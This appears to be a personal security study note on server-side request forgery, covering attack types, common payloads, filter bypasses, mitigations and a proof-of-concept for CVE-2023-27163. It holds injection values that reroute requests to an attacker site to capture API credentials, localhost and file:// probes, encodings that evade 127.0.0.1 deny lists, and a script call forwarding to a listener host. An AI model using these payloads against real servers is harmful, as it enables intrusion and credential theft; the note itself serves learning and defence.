# Server-Side Request Forgery (SSRF)

[![ssrfqi](../../../../_badges/thmp/ssrfqi.svg)](https://tryhackme.com/room/ssrfqi)
[![testingforssrf](../../../../_badges/owasp/testingforssrf.svg)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery)
[![server_side_request_forgery](../../../../_badges/poat/server_side_request_forgery.svg)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

<div class="row row-cols-lg-2"><div>

Server-Side Request Forgery (SSRF) is an attack in which a hacker can make a server request something from another server, usually an internal server or an API.

From instance, a website using an API. If there is a SSRF vulnerability, the hacker may be able to query the API by exploiting the website.

Common usages are:

* Port mapping
* Firewall by-pass
* Steal sensitive data
</div><div>

There are two kinds of SSRF

* **Regular/in-band SSRF**: the client will see the result
* **Blind/out-band SSRF**: nothing is returned to the client

Refer to [request grabber](/cybersecurity/red-team/_knowledge/topics/request_grabber.md) to catch requests.
</div></div>

<hr class="sep-both">

## Common payloads

<div class="row row-cols-lg-2"><div>

#### Forms

A common scenario is a [PHP](/programming-languages/web/php/_general/index.md) call to `file_get_contents` to access a remote file. You have similar functions in other languages.

**Mapping ports/services** üó∫Ô∏è

You may inject URLs such as `http://localhost:22` to test if the port `22` is open. You could also make the server call `http://ifconfig.pro/` to get some information <small>(IP, DNS...)</small>.

**Steal files** üí∞

You may inject URLs to steal a file. For instance, a URL using the file protocol: `file://some/file/on/the/target`.
</div><div>

#### URL

**Access another untended path** ‚úÇ<br> `a?api=path` $\to$ `b/path`

In that case, you could guess that the first server A is mapping the value given to `api` to the server b. You may try to inject the path, and see if you can access other API routes.

**Steal API credentials** üóùÔ∏è<br> `a?api=xxx&r=path` $\to$ `xxx.b/path`

If the programmer is using user input to determine which server will be queried, then the hacker may try to send the request to their servers instead, and get the API credentials inside the headers.

For instance, with the `api=xxx`, a normal request could be sent to `xxx.thebestapi.com/path`. But, if a hacker uses `api=malicious_website.com?&ignore=`, then the URL crafted is `malicious_website.com?&ignore=.thebestapi.com/path`. Notice that the request is now sent to another website, and the concatenated domain name is now the value of `ignore`.
</div></div>

<hr class="sep-both">

## Mitigations üõ°Ô∏è

<div class="row row-cols-lg-2"><div>

**Allow List/Whitelist**

It's usually the better way. But, if there is a condition like `the URL must start with https://example.com`, then it can be bypassed with `https://example.com.malicious.website`.

**Others**

* Check that the resource type is what was expected
* ...

</div><div>

**Deny list/Blacklist**

You may allow every IP aside from some such as localhost (127.0.0.1), or 169.254.169.254 in a cloud environment, but there are usually a lot of ways to bypass such filters.

For instance, `0`, `00`, `000[...]0`, `0.0.0.0`, `127.1` (IP shortening), `2130706433` (decimal), `017700000001` (octal), and many more such as [127.0.0.1.nip.io](http://127.0.0.1.nip.io)/[localtest.me](http://localtest.me) are all resolving to `127.0.0.1`.
</div></div>

<hr class="sep-both">

## Example CVEs

<div class="row row-cols-lg-2"><div>

#### CVE-2023-27163

[![sau](../../../../_badges/htb-p/sau.svg)](https://app.hackthebox.com/machines/Sau)

CVE in [request-baskets](https://github.com/darklynx/request-baskets). [POC (shell script)](https://github.com/entr0pie/CVE-2023-27163) <small>(0.02k ‚≠ê)</small>.

```shell!
$ ./CVE-2023-27163.sh http://target:port http://listener:port 
Creating the "<backet>" proxy basket...
Basket created!
$ curl http://target:port/<backet> # send to listener
```

It can be used to access a resource behind a firewall.

```ps
$ ./CVE-2023-27163.sh http://target:port http://target:port2 
```
</div><div>
</div></div>

<hr class="sep-both">

## üëª To-do üëª

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

Other attack vectors

* avatar form
* a script
* a header
* ...
</div><div>

* Blind SSRF (requestbin/burp collaborator)
</div></div>